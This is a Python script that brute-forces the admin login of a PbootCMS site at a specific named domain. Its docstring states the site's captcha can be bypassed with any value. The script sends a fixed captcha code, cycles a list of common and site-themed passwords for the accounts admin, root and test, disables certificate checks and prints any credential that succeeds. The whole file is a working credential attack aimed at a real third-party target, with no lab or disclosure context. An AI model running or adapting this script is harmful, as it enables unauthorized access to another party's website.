#!/usr/bin/env python3
"""haitai_bf2.py - haitaicasting PbootCMS爆破(验证码绕过确认)
checkcode可任意值, 直接爆密码
"""
import urllib.request, urllib.parse, ssl, re, http.cookiejar, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://haitaicasting.com'
LOGIN = BASE + '/admin.php?p=/Index/login'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "pbootcms", "haitai123", "haitaicasting", "123456789",
             "1qaz2wsx", "qwe123", "admin!@#", "adminadmin", "ht123456",
             "casting123", "haitai", "1234567890", "a123456789", "Aa123456"]

def main():
    for user in ['admin', 'root', 'test']:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj),
                                             urllib.request.HTTPSHandler(context=ctx))
        for pw in PASSWORDS:
            data = urllib.parse.urlencode({'formcheck': '1', 'username': user, 'password': pw,
                                           'checkcode': '0000'}).encode()
            try:
                req = urllib.request.Request(LOGIN, data=data,
                                             headers={**UA, 'Content-Type': 'application/x-www-form-urlencoded',
                                                      'Referer': LOGIN, 'X-Requested-With': 'XMLHttpRequest'})
                resp = opener.open(req, timeout=10)
                b = resp.read(15000).decode('utf-8', 'ignore')
                fu = resp.geturl()
                st = resp.status
            except urllib.error.HTTPError as e:
                st, b, fu = e.code, e.read(15000).decode('utf-8', 'ignore'), e.geturl()
            except Exception:
                continue
            if '成功' in b or ('index' in fu.lower() and 'login' not in fu.lower()):
                print('!!! HIT: %s/%s -> %s' % (user, pw, fu), flush=True)
                print('  body: %s' % b[:200], flush=True)
                sys.exit(0)
            if '密码' not in b and '错误' not in b and '失败' not in b and len(b) > 100:
                print('CHECK %s/%s st=%d: %s' % (user, pw, st, b[:150]), flush=True)
                sys.exit(0)
            if pw == PASSWORDS[0]:
                print('sample resp %s: %s' % (user, b[:120].replace(chr(10), ' ')), flush=True)
            time.sleep(0.2)
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
